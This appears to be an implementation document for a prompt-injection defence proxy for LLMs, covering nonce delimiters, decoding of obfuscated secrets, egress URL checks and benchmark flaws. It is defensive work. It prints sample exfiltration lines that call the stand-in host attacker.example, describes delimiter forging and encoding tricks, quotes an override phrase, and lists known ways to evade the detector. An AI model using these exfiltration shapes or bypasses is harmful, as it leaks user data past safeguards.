<!-- © https://github.com/YouFoundTheDev | 2026 -->
<!-- 03-IMPLEMENTATION.md -->

# Implementation

This document walks the code. It also walks the parts that were wrong first,
because on this project the interesting engineering was mostly in discovering
that something which passed its tests was not doing anything.

Every milestone ended the same way: write the tests, watch them fail, implement,
run the gate, then **remove the implementation and check that a specific test
goes red.** A control that stays green when you delete the thing it tests is
decoration. That step found more real defects than the tests did.

## The trust model comes first

Start with `envelope.py`, because everything else depends on getting it right.

The first version stored taint as a boolean on the context and asked the caller
to set it when adding a document. That is a bug generator: the boolean can
disagree with the content, and the failure is silent exactly when it matters.
The rewrite derives exposure from the segments instead:

```python
@property
def exposed(self) -> tuple[Source, ...]:
    return tuple(
        segment.source for segment in self.segments
        if segment.provenance is Provenance.CONTENT
        and segment.source is not None
    )
```

There is no setter, so there is nothing to forget. `Segment.__post_init__` also
refuses to construct a `CONTENT` segment without a source, which means the type
cannot represent an unlabelled document at all.

**Lesson:** make the invalid state unrepresentable rather than remembering not
to enter it. The test for this is not "taint is set correctly"; it is "I cannot
build the bad object."

## The fence, and the forge attempt

`compose()` wraps each external segment in a delimiter carrying the envelope's
nonce:

```python
opened = FENCES.open.format(nonce = nonce, channel = ..., ref = ...)
return f"{opened}\n{segment.body}\n{FENCES.close.format(nonce = nonce)}"
```

The interesting test is not "the nonce appears." It is the adversarial one: put
a *closing* delimiter inside the content using the previous request's nonce and
assert the rendered prompt still has exactly one closing fence. A static
delimiter fails that test immediately, which is the point.

The property test uses Hypothesis over 500 guessed nonces and asserts that none
of them closes a real fence. That is the only way to test "unguessable" without
pretending a fixed sample proves it.

## Decoding closure, and why order matters

The naive design is a fixed pipeline: normalize, then base64-decode, then strip
separators. It loses, because the attacker chooses the order.

- `base64("-".join(secret))` needs **peel then drop separators**
- `"-".join(base64(secret))` needs **drop separators then peel**

So `spectrum.py` closes over the orderings instead: a breadth-first walk over a
fixed set of inverses (`flatten`, `peel`, `inline-decode`, `drop_separators`,
`alnum_only`, `rot13`, `reverse`), bounded by rounds and by a variant count.

The bound is not decoration. Without it, a text that keeps producing new
readings is an unbounded work generator driven by attacker input. The test that
matters is `test_the_reading_search_terminates_on_hostile_input`.

## The URL rule that ate every code comment

Egress control has to catch protocol-relative URLs, because
`![x](//attacker.example/p?d=1)` is a real exfiltration shape. The first
implementation matched `//` and then looked up the host.

That made every code comment in model output a `CRITICAL` spill violation. Three
of the benign corpus cases failed:

```
1 alert     See https://attacker.example/c?d=1
0 alerts    See HTTPS://attacker.example/c?d=1
0 alerts    ![x](//attacker.example/p?d=1)
```

Two separate bugs in that output. The second line is the interesting one: the
uppercase scheme appeared to work because the optional scheme group simply failed
to match `HTTPS:` and the regex started at `//`, silently relying on the
protocol-relative branch. The `re.IGNORECASE` flag that was supposed to fix it
was inert, and deleting it turned nothing red. Two mechanisms were alibiing each
other.

The fix was to require a dot in the authority, which keeps `//server/share` out
and `//attacker.example/p` in. The redundant flag was deleted and the real
mechanism documented.

**Lesson:** an ablation that removes a mechanism and sees no red test has found
either redundancy or a lie. Both are worth knowing, and neither is a pass.

## The benchmark that was reading a `continue`

This is the worst bug in the project and it was in the measurement, not the code.

The benchmark reported a **0.0%** false-positive rate. It was wrong. Every
adversarially-benign case sat in a `REQUEST` segment, and phrasing skips
everything that is not `CONTENT` by construction. The benchmark was therefore
scoring a `continue` statement and reporting it as a detector that never
misfires.

Against realistic support-desk sentences placed in external content, the true
rate was **80%**. "The 8814 can act as a backup unit when the primary fails" was
a hard refusal.

Three fixes, all of them structural:

1. The corpus was split so the hard benign class sits where phrasing actually
   runs.
2. A test now fails if that class ever drifts back into a request segment.
3. The report prints the hard number on its own line, above the pooled one.

The residual false positive — a document cross-reference, "Please disregard the
previous instructions on page 12" — is reported rather than engineered away,
because hiding it would recreate the original sin at a smaller scale.

## Fail closed, including on your own crashes

`engine._run` wraps every check:

```python
try:
    return self.inbound[name].run(envelope, self.contract)
except Exception as error:
    return [self._fault(name, error)]
```

`_fault` returns a hard `CRITICAL` alert, so a crash refuses. There is a
parametrised test that monkeypatches each check to raise and asserts the outcome
is `REFUSE` with a `check-fault` alert naming that check.

There is a second test in the same file that asserts the *other* checks still
ran. Those are different guarantees: failing closed is not the same as failing
all at once.

## The proxy contract test

The proxy claims to be a drop-in for an OpenAI-shaped client. Claiming it is easy;
proving it is not, because a hand-written response shape drifts.

The test validates the response against the real `openai` client's
`ChatCompletion` model:

```python
parsed = ChatCompletion.model_validate(response.json())
assert parsed.choices[0].message.role == "assistant"
```

That is why the response carries empty `usage` counters and a `logprobs` key
nobody reads: a real client validates them. The test also covers the four message
shapes real clients send — null assistant content, multimodal parts, assistant
turns carrying tool calls, and tool results keyed by `tool_call_id` — because a
proxy that rejects its own client is not a proxy.

## The container that could not write

The first Dockerfile ran `uv run uvicorn` as the container entrypoint. It
restart-looped under `read_only: true` with `Could not create temporary file`.

Two lessons, both about where testing stops:

- `uv run` at container start re-resolves the environment on every boot and
  needs a writable cache. Bake the environment instead, and call `uvicorn`
  directly.
- No unit test could have caught it. The suite never starts a container, and a
  container-only failure has to be caught by running the container.

## What is still wrong

Kept here rather than in a changelog nobody reads.

- **Phrasing reads one segment at a time.** An injection split across two
  segments is not caught. Closing that gap would need a check that reads the
  whole envelope, which would break the uniform per-segment shape and the
  ablation.
- **The closure is bounded.** Enough stacked encoding beats it. The bound is
  deliberate, but it is a limit, not a guarantee.
- **Proxy provenance is inferred.** Documented, warned about, tested, and still
  wrong for most RAG applications.
- **The arena is single-process.** Sessions and rate limits die with the
  process. That is acceptable for a demo and unacceptable for anything else.
